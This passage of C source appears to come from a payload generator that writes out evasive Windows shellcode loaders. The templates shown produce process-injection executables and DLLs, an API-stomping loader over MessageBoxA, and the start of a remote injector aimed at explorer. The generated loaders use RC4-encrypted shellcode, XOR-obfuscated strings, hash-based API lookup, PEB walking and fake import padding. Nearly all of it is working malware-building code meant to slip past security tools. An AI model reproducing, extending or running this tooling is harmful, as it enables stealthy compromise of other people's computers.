        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID process_injection() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(EncryptedPayload);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtAllocateVirtualMemory pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtAllocateVirtualMemory((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, EncryptedPayload, sPayloadSize);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, pAddress, sizeof(ProtectedKey), sPayloadSize);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    process_injection();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID _source_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE ,PVOID* ,ULONG_PTR ,PSIZE_T ,ULONG ,ULONG );\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID process_injection() {\n"
        "    HANDLE        hThread = NULL;\n"
        "    PVOID         pAddress = NULL;\n"
        "    DWORD         old = 0;\n"
        "    SIZE_T        sPayloadSize = sizeof(EncryptedPayload);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtAllocateVirtualMemory pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtAllocateVirtualMemory((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, EncryptedPayload, sPayloadSize);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, pAddress, sizeof(ProtectedKey), sPayloadSize);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "VOID run() {\n"
        "    process_injection();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "    return 0;\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID _source_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* obfuscated_user32 = obf("user32.dll", xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
        "#define MessageBoxA_djb2                0x4A096AA1\n\n"


        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char puser32[] = {%s};\n"



        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL API_stommping() {\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    DWORD old_protection = 0;\n"
        "    HANDLE hthread = NULL;\n"
        "    SIZE_T Spayload = sizeof(EncryptedPayload);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"

        "    obf((char*)puser32, sizeof(puser32), xkey, sizeof(xkey));\n"
        "    PVOID  address = GetProcAddressH(pLoadLibraryA(puser32), MessageBoxA_djb2);\n"


        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1 , &address, &Spayload, PAGE_READWRITE, &old_protection);\n"
        "    memcpy(address, EncryptedPayload, Spayload);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), Spayload);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1 , &address, &Spayload, PAGE_EXECUTE_READ, &old_protection);\n"
        "    pNtCreateThreadEx(&hthread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, FALSE, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(hthread, FALSE, &timeout);\n"
        "    pNtClose(hthread);\n"
        "    return TRUE;\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    API_stommping();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, obfuscated_user32, shellcodeArray, keyArray, hint
    );
}
VOID _source_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint , const char* Rprocess) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
